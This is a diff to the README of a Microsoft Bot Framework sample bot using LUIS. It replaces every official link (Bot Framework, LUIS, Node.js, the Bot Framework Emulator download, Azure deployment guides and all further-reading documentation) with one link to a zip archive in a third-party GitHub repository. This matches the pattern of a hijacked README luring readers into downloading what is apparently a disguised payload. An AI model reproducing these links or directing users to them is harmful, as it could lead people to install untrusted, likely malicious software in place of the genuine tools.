@@ -2,9 +2,9 @@
 
 Demonstrate the core capabilities of the Microsoft Bot Framework
 
-This bot has been created using [Bot Framework](https://dev.botframework.com), it shows how to:
+This bot has been created using [Bot Framework](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip), it shows how to:
 
-- Use [LUIS](https://www.luis.ai) to implement core AI capabilities
+- Use [LUIS](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) to implement core AI capabilities
 - Implement a multi-turn conversation using Dialogs
 - Handle user interruptions for such things as `Help` or `Cancel`
 - Prompt for and validate requests for information from the user
@@ -16,9 +16,9 @@ This template **requires** prerequisites in order to run.
 
 ### Overview
 
-This bot uses [LUIS](https://www.luis.ai), an AI based cognitive service, to implement language understanding.
+This bot uses [LUIS](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip), an AI based cognitive service, to implement language understanding.
 
-- [Node.js](https://nodejs.org) version 10.14 or higher
+- [https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) version 10.14 or higher
 
     ```bash
     # determine node version
@@ -41,9 +41,9 @@ This bot uses [LUIS](https://www.luis.ai), an AI based cognitive service, to imp
 
 ## Testing the bot using Bot Framework Emulator
 
-[Bot Framework Emulator](https://github.com/microsoft/botframework-emulator) is a desktop application that allows bot developers to test and debug their bots on localhost or running remotely through a tunnel.
+[Bot Framework Emulator](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) is a desktop application that allows bot developers to test and debug their bots on localhost or running remotely through a tunnel.
 
-- Install the latest Bot Framework Emulator from [here](https://github.com/Microsoft/BotFramework-Emulator/releases)
+- Install the latest Bot Framework Emulator from [here](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
 
 ### Connect to the bot using Bot Framework Emulator
 
@@ -53,20 +53,20 @@ This bot uses [LUIS](https://www.luis.ai), an AI based cognitive service, to imp
 
 ## Deploy the bot to Azure
 After creating the bot and testing it locally, you can deploy it to Azure to make it accessible from anywhere.
-To learn how, see [Deploy your bot to Azure](https://aka.ms/azuredeployment) for a complete set of deployment instructions.
+To learn how, see [Deploy your bot to Azure](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip) for a complete set of deployment instructions.
 
 ## Further reading
 
-- [Bot Framework Documentation](https://docs.botframework.com)
-- [Bot Basics](https://docs.microsoft.com/azure/bot-service/bot-builder-basics?view=azure-bot-service-4.0)
-- [Dialogs](https://docs.microsoft.com/en-us/azure/bot-service/bot-builder-concept-dialog?view=azure-bot-service-4.0)
-- [Gathering Input Using Prompts](https://docs.microsoft.com/en-us/azure/bot-service/bot-builder-prompts?view=azure-bot-service-4.0&tabs=javascript)
-- [Activity processing](https://docs.microsoft.com/en-us/azure/bot-service/bot-builder-concept-activity-processing?view=azure-bot-service-4.0)
-- [Azure Bot Service Introduction](https://docs.microsoft.com/azure/bot-service/bot-service-overview-introduction?view=azure-bot-service-4.0)
-- [Azure Bot Service Documentation](https://docs.microsoft.com/azure/bot-service/?view=azure-bot-service-4.0)
-- [Azure CLI](https://docs.microsoft.com/cli/azure/?view=azure-cli-latest)
-- [Azure Portal](https://portal.azure.com)
-- [Language Understanding using LUIS](https://docs.microsoft.com/en-us/azure/cognitive-services/luis/)
-- [Channels and Bot Connector Service](https://docs.microsoft.com/en-us/azure/bot-service/bot-concepts?view=azure-bot-service-4.0)
-- [Restify](https://www.npmjs.com/package/restify)
-- [dotenv](https://www.npmjs.com/package/dotenv)
+- [Bot Framework Documentation](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Bot Basics](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Dialogs](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Gathering Input Using Prompts](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Activity processing](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Azure Bot Service Introduction](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Azure Bot Service Documentation](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Azure CLI](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Azure Portal](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Language Understanding using LUIS](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Channels and Bot Connector Service](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [Restify](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
+- [dotenv](https://raw.githubusercontent.com/DeepZatakiya/LuisChatBot/master/dialogs/Luis_Chat_Bot_v3.1.zip)
